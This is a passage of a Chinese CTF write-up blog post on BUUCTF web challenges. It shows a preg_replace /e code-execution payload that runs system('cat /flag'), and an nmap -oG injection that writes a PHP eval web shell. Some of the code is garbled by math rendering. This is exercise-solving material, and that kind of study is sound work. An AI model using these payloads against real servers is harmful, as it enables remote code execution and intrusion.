+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">G</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen"><span class="mopen">[</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">i</span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">]</span><span class="mpunct">;</span></span></span></span>_SESSION['id'] = $id;</p>
+<p>function complex($re, $str) {<br />
+return preg_replace(<br />
+'/(' . $re . ')/ei',<br />
+'strtolower(&quot;\1&quot;)',<br />
+$str<br />
+);<br />
+}</p>
+<p>foreach($_GET as $re =&gt; str) {
+    echo complex(re, $str). &quot;\n&quot;;<br />
+}</p>
+<p>function getFlag(){<br />
+@eval($_GET['cmd']);<br />
+}</p>
+<p>这里的漏洞出在<strong> preg_replace</strong> <strong>/e</strong> 模式下</p>
+<p>e 模式下的 preg_replace 可以让第二个参数 ' 替换字符串 ' 当作代码执行，但是这里第二个参数是不可变的，但因为有这种特殊的情况，正则表达式模式或部分模式两边添加圆括号会将相关匹配存储到一个临时缓存区，并且从 1 开始排序，而 strtolower (&quot;\1&quot;) 正好表达的就是匹配区的第一个（\1=\1），从而我们如果匹配可以，则可以将函数实现。<br />
+比如我们传入？.*=<strong>{${phpinfo()}}</strong></p>
+<p>原句：preg_replace ('/(' . <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi><mi>e</mi><msup><mi mathvariant="normal">.</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mi>e</mi><msup><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><msup><mo separator="true">,</mo><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi>s</mi><mi>t</mi><mi>r</mi><mi>t</mi><mi>o</mi><mi>l</mi><mi>o</mi><mi>w</mi><mi>e</mi><mi>r</mi><mo stretchy="false">(</mo><mi mathvariant="normal">&quot;</mi><mspace linebreak="newline"></mspace><mn>1</mn><mi mathvariant="normal">&quot;</mi><msup><mo stretchy="false">)</mo><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">re . &#x27;)/ei&#x27;,&#x27;strtolower(&quot;\\1&quot;)&#x27;,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord">.</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord">/</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal">i</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct"><span class="mpunct">,</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">t</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">(</span><span class="mord">&quot;</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">&quot;</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span></span></span></span>str); 就变成 preg_replace ('/(' .* ')/ei','strtolower (&quot;\1&quot;)',<strong>{${phpinfo()}}</strong>);</p>
+<p>又因为 $_GET 传入首字母是非法字符时候会把  .（点号）改成下划线，因此得将.<em> 换成 \s</em></p>
+<p>所有 payload：?\S*=${getFlag ()}&amp;cmd=system ('ls /');</p>
+<p><img data-src="https://img2022.cnblogs.com/blog/2729166/202206/2729166-20220627134114716-1034484069.png" alt="img" /></p>
+<p>终于看到了 flag，然后将 cmd 里改成 cat /flag 即可</p>
+<p>?\S*=${getFlag()}&amp;cmd=system('cat /flag');</p>
+<p><img data-src="https://img2022.cnblogs.com/blog/2729166/202206/2729166-20220627134226627-1152733174.png" alt="img" /></p>
+<h2 id="buuctf-2018online-tool"><a class="anchor" href="#buuctf-2018online-tool">#</a> [BUUCTF 2018]Online Tool</h2>
+<p><img data-src="C:%5CUsers%5C86182%5CDesktop%5CmyBlog%5Cassets%5Cimage-20240428210310186.png" alt="image-20240428210310186" /></p>
+<p>nmap -T5 -sT -Pn --host-timeout 2 -F host -T&lt;0-5&gt; : 速度 / 时间模板参数，指定了扫描的速度。 -sT : 使用 TCP 进行扫描。 -Pn : 将所有主机视为在在线，跳过主机发现。 --host-timeout : 设置超时时间。设置为 2 秒，即如果目标主机在 2 秒内没有响应，Nmap 将放弃该主机的扫描。 -F : 进行快速扫描，用于快速识别目标主机上开放的常见端口，而不扫描所有的端口。</p>
+<blockquote>
+<p>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数<br />
+功能 ： <code>escapeshellarg()</code>  将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，<br />
+这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含  <code>exec()</code> ,  <code>system()</code>  执行运算符 (反引号)</p>
+</blockquote>
+<blockquote>
+<p>escapeshellcmd — shell 元字符转义<br />
+功能： <code>escapeshellcmd()</code>  对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。<br />
+此函数保证用户输入的数据在传送到  <code>exec()</code>  或  <code>system()</code>  函数，或者 执行操作符 之前进行转义。</p>
+<p>反斜线（\）会在以下字符之前插入：<br />
+&amp;#;`|?<span></span>~&lt;&gt;^()<span></span>{}$<em>, \x0A 和 \xFF</em>。 *’ 和 “ 仅在不配对儿的时候被转义。<br />
+在 Windows 平台上，所有这些字符以及 % 和！字符都会被空格代替。</p>
+</blockquote>
+<p>构建 payload： <code>?host=' &lt;?php eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php '</code></p>
+<p><img data-src="C:%5CUsers%5C86182%5CDesktop%5CmyBlog%5Cassets%5Cimage-20240428210330513.png" alt="image-20240428210330513" /></p>
+
+      <div class="tags">
+          <a href="/tags/buuctf/" rel="tag"><i class="ic i-tag"></i> buuctf</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">Edited on</span>
+    <time title="Modified: 2024-04-28 22:54:28" itemprop="dateModified" datetime="2024-04-28T22:54:28+08:00">2024-04-28</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> Donate</button>
+  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="odiws WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="odiws Alipay">
+        <p>Alipay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="odiws PayPal">
+        <p>PayPal</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>Post author:  </strong>odiws <i class="ic i-at"><em>@</em></i>Hexo
+  </li>
+  <li class="link">
+    <strong>Post link: </strong>
+    <a href="http://odiws.github.io/2024/04/29/5-txt/" title="buuctf4月29日">http://odiws.github.io/2024/04/29/5-txt/</a>
+  </li>
+  <li class="license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2024/04/28/4-txt/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?625217" title="buuctf4月28日">
+  <span class="type">Previous Post</span>
+  <span class="category"><i class="ic i-flag"></i> 刷题笔记</span>
+  <h3>buuctf4月28日</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2024/05/05/5%E6%9C%885%E6%97%A5buu/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?211803" title="buuctf5月5日">
+  <span class="type">Next Post</span>
+  <span class="category"><i class="ic i-flag"></i> 刷题笔记</span>
+  <h3>buuctf5月5日</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="Contents">
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf2020the-mystery-of-ip"><span class="toc-number">1.</span> <span class="toc-text"> [BJDCTF2020]The mystery of ip</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#image-20240428191224568"><span class="toc-number">1.1.</span> <span class="toc-text"> </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssti%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.</span> <span class="toc-text"> ssti 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%85%A5config%E7%9C%8B%E7%9C%8B%E9%85%8D%E7%BD%AE%E6%98%AFsmarty"><span class="toc-number">1.3.</span> <span class="toc-text"> 输入 {config} 看看配置，是 smarty</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9C%8B%E7%9C%8B%E7%89%88%E6%9C%ACsmartyversion%E4%B8%8A%E7%BD%91%E6%89%BE%E5%AE%83%E7%89%B9%E7%82%B9%E5%91%97"><span class="toc-number">1.4.</span> <span class="toc-text"> 看看版本 {$smarty.version}，上网找它特点呗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B9%9F%E5%B0%B1%E6%98%AFif%E6%98%AF%E9%85%8D%E5%AF%B9%E7%94%A8%E7%9A%84if%E5%92%8Cif%E4%B8%94if%E5%86%85%E5%8F%AF%E4%BB%A5%E8%BF%90%E8%A1%8Cphp%E4%BB%A3%E7%A0%81"><span class="toc-number">1.5.</span> <span class="toc-text"> 也就是 if 是配对用的 if 和 &#x2F;if，且 if 内可以运行 php 代码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84phpweb-1"><span class="toc-number">2.</span> <span class="toc-text"> [网鼎杯 2020 朱雀组] phpweb 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bsidescf-2020had-a-bad-day"><span class="toc-number">3.</span> <span class="toc-text"> [BSidesCF 2020]Had a bad day</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%B7%BB%E5%8A%A0%E4%B8%80%E4%B8%AA%E5%BF%85%E9%A1%BB%E8%A6%81%E7%9A%84%E5%8D%95%E8%AF%8D%E4%B8%8D%E4%BC%9A%E5%BD%B1%E5%93%8D%E6%AD%A3%E5%B8%B8%E7%9A%84%E5%8C%85%E5%90%AB"><span class="toc-number">3.1.</span> <span class="toc-text"> php 伪协议添加一个必须要的单词不会影响正常的包含</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf2020zjctf%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4"><span class="toc-number">4.</span> <span class="toc-text"> [BJDCTF2020] ZJCTF，不过如此</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#buuctf-2018online-tool"><span class="toc-number">5.</span> <span class="toc-text"> [BUUCTF 2018]Online Tool</span></a></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="Related">
+        <ul>
+          <li><a href="/2024/04/28/3-txt/" rel="bookmark" title="buuctf4月27日">buuctf4月27日</a></li><li><a href="/2024/04/28/4-txt/" rel="bookmark" title="buuctf4月28日">buuctf4月28日</a></li><li class="active"><a href="/2024/04/29/5-txt/" rel="bookmark" title="buuctf4月29日">buuctf4月29日</a></li><li><a href="/2024/05/05/5%E6%9C%885%E6%97%A5buu/" rel="bookmark" title="buuctf5月5日">buuctf5月5日</a></li><li><a href="/2024/05/25/buuctf5%E6%9C%8825%E6%97%A5/" rel="bookmark" title="buu5月25日">buu5月25日</a></li><li><a href="/2024/05/26/buuctf5%E6%9C%8826%E6%97%A5/" rel="bookmark" title="buuctf5月26日">buuctf5月26日</a></li><li><a href="/2024/05/27/buuctf5%E6%9C%8827%E6%97%A5/" rel="bookmark" title="[红明谷CTF 2021]write_shell">[红明谷CTF 2021]write_shell</a></li><li><a href="/2024/05/28/buuctf5%E6%9C%8828%E6%97%A5/" rel="bookmark" title="'[GWCTF 2019]枯燥的抽奖'">'[GWCTF 2019]枯燥的抽奖'</a></li><li><a href="/2024/05/29/cookbook-1/" rel="bookmark" title="[nctf2019]truecookbook">[nctf2019]truecookbook</a></li><li><a href="/2024/05/30/Web5-CyberPunk/" rel="bookmark" title="Web5]CyberPunk">Web5]CyberPunk</a></li><li><a href="/2024/05/30/Web1-Dropbox/" rel="bookmark" title="Web1]Dropbox">Web1]Dropbox</a></li><li><a href="/2024/06/02/2017-SSRFme/" rel="bookmark" title="‘’[HITCON 2017]SSRFme‘’">‘’[HITCON 2017]SSRFme‘’</a></li><li><a href="/2024/06/03/GYCTF2020-Ezsqli/" rel="bookmark" title="'[GYCTF2020]Ezsqli'">'[GYCTF2020]Ezsqli'</a></li><li><a href="/2024/06/06/%5BRootersCTF2019%5DI_3_Flask/" rel="bookmark" title="'[RootersCTF2019]I_<3_Flask'">'[RootersCTF2019]I_<3_Flask'</a></li><li><a href="/2024/06/06/%5BNCTF2019%5DSQLi/" rel="bookmark" title="'[NCTF2019]SQLi'">'[NCTF2019]SQLi'</a></li><li><a href="/2024/06/07/%5BNPUCTF2020%5Dezinclude/" rel="bookmark" title="'[NPUCTF2020]ezinclude'">'[NPUCTF2020]ezinclude'</a></li><li><a href="/2024/06/10/2018-Comment/" rel="bookmark" title="'[网鼎杯 2018]Comment'">'[网鼎杯 2018]Comment'</a></li><li><a href="/2024/06/11/HarekazeCTF2019-encode-and-encode/" rel="bookmark" title="[HarekazeCTF2019]encode_and_encode">[HarekazeCTF2019]encode_and_encode</a></li><li><a href="/2024/06/11/2019-EasyWeb/" rel="bookmark" title="[SUCTF 2019]EasyWeb">[SUCTF 2019]EasyWeb</a></li><li><a href="/2024/06/13/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish/" rel="bookmark" title="[网鼎杯2018]Unfinish">[网鼎杯2018]Unfinish</a></li><li><a href="/2024/06/13/Secret/" rel="bookmark" title="’[CISCN2019 华东南赛区]Double Secret‘">’[CISCN2019 华东南赛区]Double Secret‘</a></li><li><a href="/2024/06/16/Injection/" rel="bookmark" title="October 2019 Twice SQL Injection">October 2019 Twice SQL Injection</a></li><li><a href="/2024/06/16/GYCTF2020-EasyThinking/" rel="bookmark" title="[GYCTF2020]EasyThinking">[GYCTF2020]EasyThinking</a></li><li><a href="/2024/06/17/BJDCTF2020-EzPHP/" rel="bookmark" title="[BJDCTF2020]ezPHP">[BJDCTF2020]ezPHP</a></li><li><a href="/2024/06/18/2021-easycms/" rel="bookmark" title="GKCTF 2021：easycms">GKCTF 2021：easycms</a></li><li><a href="/2024/06/18/GXYCTF2019-StrongestMind/" rel="bookmark" title="[GXYCTF2019]StrongestMind">[GXYCTF2019]StrongestMind</a></li><li><a href="/2024/06/19/HFCTF2020-JustEscape/" rel="bookmark" title="[HFCTF2020]JustEscape">[HFCTF2020]JustEscape</a></li><li><a href="/2024/06/19/2018-GetShell/" rel="bookmark" title="[suctf2018]GetShell">[suctf2018]GetShell</a></li><li><a href="/2024/06/20/Mars/" rel="bookmark" title="[b01lers2020]lifeMars">[b01lers2020]lifeMars</a></li><li><a href="/2024/06/21/Again/" rel="bookmark" title="[WMCTF2020]Make PHP Great Again">[WMCTF2020]Make PHP Great Again</a></li><li><a href="/2024/07/24/MRCTF2020-Ezaudit/" rel="bookmark" title="[MRCTF2020]Ezaudit">[MRCTF2020]Ezaudit</a></li><li><a href="/2024/07/25/2019-Web-Unagi/" rel="bookmark" title="[CSAWQual2019]Web_Unagi">[CSAWQual2019]Web_Unagi</a></li><li><a href="/2024/07/26/1/" rel="bookmark" title="easybypass">easybypass</a></li><li><a href="/2024/07/28/2020-Greatphp/" rel="bookmark" title="[极客大挑战2020]Greatphp">[极客大挑战2020]Greatphp</a></li><li><a href="/2024/07/28/2019-SVGMagic/" rel="bookmark" title="[BSidesCF2019]SVGMagic">[BSidesCF2019]SVGMagic</a></li><li><a href="/2024/07/29/ISITDTU2019-EasyPHP/" rel="bookmark" title="[羊城杯2020]easyphp">[羊城杯2020]easyphp</a></li><li><a href="/2024/07/30/Shop/" rel="bookmark" title="Shop">Shop</a></li><li><a href="/2024/08/01/FireshellCTF2020-CaasC%E7%9A%84%E9%A2%84%E5%A4%84%E7%90%86/" rel="bookmark" title="[FireshellCTF2020]CaasC的预处理">[FireshellCTF2020]CaasC的预处理</a></li><li><a href="/2024/08/04/HarekazeCTF2019-AvatarUploader1/" rel="bookmark" title="[HarekazeCTF2019]AvatarUploader1">[HarekazeCTF2019]AvatarUploader1</a></li><li><a href="/2024/08/04/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-easyphp/" rel="bookmark" title="[ISITDTU 2019]EasyPHP">[ISITDTU 2019]EasyPHP</a></li><li><a href="/2024/08/06/GYCTF2020-Easyphp/" rel="bookmark" title="[GYCTF2020]Easyphp">[GYCTF2020]Easyphp</a></li><li><a href="/2024/08/07/2018-eating-cms/" rel="bookmark" title="2018]eating_cms">2018]eating_cms</a></li><li><a href="/2024/08/09/GYCTF2020-Ez-Express/" rel="bookmark" title="[GYCTF2020]Ez_Express">[GYCTF2020]Ez_Express</a></li><li><a href="/2024/08/11/SUCTF2018-MultiSQL-MySQL%E9%A2%84%E5%A4%84%E7%90%86%E5%AD%A6%E4%B9%A0/" rel="bookmark" title="[SUCTF2018]MultiSQL-MySQL预处理学习">[SUCTF2018]MultiSQL-MySQL预处理学习</a></li><li><a href="/2024/08/13/2019%E5%BC%BA%E7%BD%91%E6%9D%AFUpload%E9%A2%98/" rel="bookmark" title="2019强网杯Upload题">2019强网杯Upload题</a></li><li><a href="/2024/08/15/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="bookmark" title="[安洵杯2019]不是文件上传">[安洵杯2019]不是文件上传</a></li><li><a href="/2024/08/16/SUCTF2018-annonymous/" rel="bookmark" title="[SUCTF2018]annonymous">[SUCTF2018]annonymous</a></li><li><a href="/2024/08/17/RootersCTF2019-babyWeb/" rel="bookmark" title="[RootersCTF2019]babyWeb">[RootersCTF2019]babyWeb</a></li><li><a href="/2024/08/19/bestphp-srevenge/" rel="bookmark" title="bestphp'srevenge">bestphp'srevenge</a></li><li><a href="/2024/08/21/GXYCTF2019-BabysqliV3-0/" rel="bookmark" title="[GXYCTF2019]BabysqliV3.0">[GXYCTF2019]BabysqliV3.0</a></li><li><a href="/2024/08/23/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web4/" rel="bookmark" title="[CISCN2019华东南赛区]Web4">[CISCN2019华东南赛区]Web4</a></li><li><a href="/2024/08/27/EIS2019-EzPOP/" rel="bookmark" title="[EIS2019]EzPOP">[EIS2019]EzPOP</a></li><li><a href="/2024/08/28/RoarCTF2019-OnlineProxy/" rel="bookmark" title="[RoarCTF2019]OnlineProxy">[RoarCTF2019]OnlineProxy</a></li><li><a href="/2024/08/31/GWCTF2019-mypassword/" rel="bookmark" title="[GWCTF2019]mypassword">[GWCTF2019]mypassword</a></li><li><a href="/2024/09/05/pasecactf-2019-flask-ssti/" rel="bookmark" title="[pasecactf_2019]flask_ssti">[pasecactf_2019]flask_ssti</a></li><li><a href="/2024/09/06/SWPU2019-Web4/" rel="bookmark" title="[SWPU2019]Web4">[SWPU2019]Web4</a></li><li><a href="/2024/09/06/WMCTF2020-MakePHPGreatAgain2-0/" rel="bookmark" title="[WMCTF2020]MakePHPGreatAgain2.0">[WMCTF2020]MakePHPGreatAgain2.0</a></li><li><a href="/2024/09/08/HFCTF2020-BabyUpload/" rel="bookmark" title="[HFCTF2020]BabyUpload">[HFCTF2020]BabyUpload</a></li><li><a href="/2024/09/09/2020-Hurdles/" rel="bookmark" title="2020]Hurdles">2020]Hurdles</a></li><li><a href="/2024/09/10/%E5%85%A5%E7%BE%A4%E9%A2%98-Web/" rel="bookmark" title="入群题]Web">入群题]Web</a></li><li><a href="/2024/09/18/Quals-Bnv/" rel="bookmark" title="Quals]Bnv">Quals]Bnv</a></li><li><a href="/2024/09/22/NPUCTF2020-ezlogin/" rel="bookmark" title="[NPUCTF2020]ezlogin">[NPUCTF2020]ezlogin</a></li><li><a href="/2024/09/22/RoarCTF2019-SimpleUpload/" rel="bookmark" title="[RoarCTF2019]SimpleUpload">[RoarCTF2019]SimpleUpload</a></li><li><a href="/2024/09/22/GWCTF2019-%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/" rel="bookmark" title="[GWCTF2019]你的名字">[GWCTF2019]你的名字</a></li><li><a href="/2024/09/23/XNUCA2019Qualifier-EasyPHP/" rel="bookmark" title="[XNUCA2019Qualifier]EasyPHP">[XNUCA2019Qualifier]EasyPHP</a></li><li><a href="/2024/09/23/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-iamthinking/" rel="bookmark" title="[安洵杯2019]iamthinking">[安洵杯2019]iamthinking</a></li><li><a href="/2024/09/24/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-Easyphp2/" rel="bookmark" title="[羊城杯2020]Easyphp2">[羊城杯2020]Easyphp2</a></li><li><a href="/2024/09/24/virink-2019-files-share/" rel="bookmark" title="virink_2019_files_share">virink_2019_files_share</a></li><li><a href="/2024/09/24/NESTCTF2019-LoveMath2/" rel="bookmark" title="[NESTCTF2019]LoveMath2">[NESTCTF2019]LoveMath2</a></li><li><a href="/2024/09/24/RootersCTF2019-ImgXweb/" rel="bookmark" title="[RootersCTF2019]ImgXweb">[RootersCTF2019]ImgXweb</a></li><li><a href="/2024/09/25/DDCTF2019-homebreweventloop/" rel="bookmark" title="[DDCTF2019]homebreweventloop">[DDCTF2019]homebreweventloop</a></li><li><a href="/2024/09/26/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-Blackcat/" rel="bookmark" title="[羊城杯2020]Blackcat">[羊城杯2020]Blackcat</a></li><li><a href="/2024/09/27/watevrCTF-2019-PickleStore/" rel="bookmark" title="[watevrCTF-2019]PickleStore">[watevrCTF-2019]PickleStore</a></li><li><a href="/2024/10/11/GYCTF2020-NodeGame-nodejs/" rel="bookmark" title="[GYCTF2020]NodeGame-nodejs">[GYCTF2020]NodeGame-nodejs</a></li><li><a href="/2024/10/15/CSAWQual2016-i-got-id/" rel="bookmark" title="[CSAWQual2016]i_got_id">[CSAWQual2016]i_got_id</a></li><li><a href="/2024/10/15/HarekazeCTF2019-EasyNotes-1/" rel="bookmark" title="[HarekazeCTF2019]EasyNotes">[HarekazeCTF2019]EasyNotes</a></li><li><a href="/2024/10/15/SWPU2019-Web3/" rel="bookmark" title="[SWPU2019]Web3">[SWPU2019]Web3</a></li><li><a href="/2024/10/15/FBCTF2019-Event/" rel="bookmark" title="[FBCTF2019]Event">[FBCTF2019]Event</a></li><li><a href="/2024/10/17/RCTF2019-Nextphp/" rel="bookmark" title="[RCTF2019]Nextphp">[RCTF2019]Nextphp</a></li><li><a href="/2024/10/17/BSidesCF-2019-PickTacToe/" rel="bookmark" title="[BSidesCF2019]Pick Tac Toe">[BSidesCF2019]Pick Tac Toe</a></li><li><a href="/2024/10/17/HITCON2016-Leaking/" rel="bookmark" title="[HITCON2016]Leaking">[HITCON2016]Leaking</a></li><li><a href="/2024/10/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-notes/" rel="bookmark" title="[网鼎杯2020青龙组]notes">[网鼎杯2020青龙组]notes</a></li><li><a href="/2024/10/21/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-EasySer/" rel="bookmark" title="[羊城杯2020]EasySer">[羊城杯2020]EasySer</a></li><li><a href="/2024/10/23/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-include0%E3%80%820/" rel="bookmark" title="[NewStarCTF2023公开赛道]include0。0">[NewStarCTF2023公开赛道]include0。0</a></li><li><a href="/2024/11/03/CISCN2021Quals-upload/" rel="bookmark" title="[CISCN2021Quals]upload">[CISCN2021Quals]upload</a></li><li><a href="/2024/11/04/2021%E7%A5%A5%E4%BA%91%E6%9D%AF-PackageManager2021/" rel="bookmark" title="[2021祥云杯]PackageManager2021">[2021祥云杯]PackageManager2021</a></li><li><a href="/2024/11/04/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020-Roamphp2-Myblog/" rel="bookmark" title="[极客大挑战2020]Roamphp2-Myblog">[极客大挑战2020]Roamphp2-Myblog</a></li><li><a href="/2024/11/05/HXBCT-2021-easywill/" rel="bookmark" title="[HXBCT_2021]easywill">[HXBCT_2021]easywill</a></li><li><a href="/2024/11/05/HFCTF2021Quals-Unsetme/" rel="bookmark" title="[HFCTF2021Quals]Unsetme">[HFCTF2021Quals]Unsetme</a></li><li><a href="/2024/11/05/WMCTF2020-Web-Check-in-2-0/" rel="bookmark" title="[WMCTF2020]Web-Check-in-2.0">[WMCTF2020]Web-Check-in-2.0</a></li><li><a href="/2024/11/07/%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/" rel="bookmark" title="[蓝帽杯_2021]One_Pointer_PHP">[蓝帽杯_2021]One_Pointer_PHP</a></li><li><a href="/2024/11/08/HarekazeCTF2019-Sqlite-Voting/" rel="bookmark" title="[HarekazeCTF2019]Sqlite-Voting">[HarekazeCTF2019]Sqlite-Voting</a></li><li><a href="/2024/11/08/JMCTF2021-UploadHub/" rel="bookmark" title="[JMCTF2021]UploadHub">[JMCTF2021]UploadHub</a></li><li><a href="/2024/11/10/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-ez-sql/" rel="bookmark" title="[NewStarCTF-2023-公开赛道]ez_sql">[NewStarCTF-2023-公开赛道]ez_sql</a></li><li><a href="/2024/11/14/NPUCTF2020-webdog/" rel="bookmark" title="NPUCTF2020webdog">NPUCTF2020webdog</a></li><li><a href="/2024/11/15/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E5%8D%8A%E5%86%B3%E8%B5%9B-faka/" rel="bookmark" title="[网鼎杯2020半决赛]faka">[网鼎杯2020半决赛]faka</a></li><li><a href="/2024/11/17/HCTF2018-Hideandseek/" rel="bookmark" 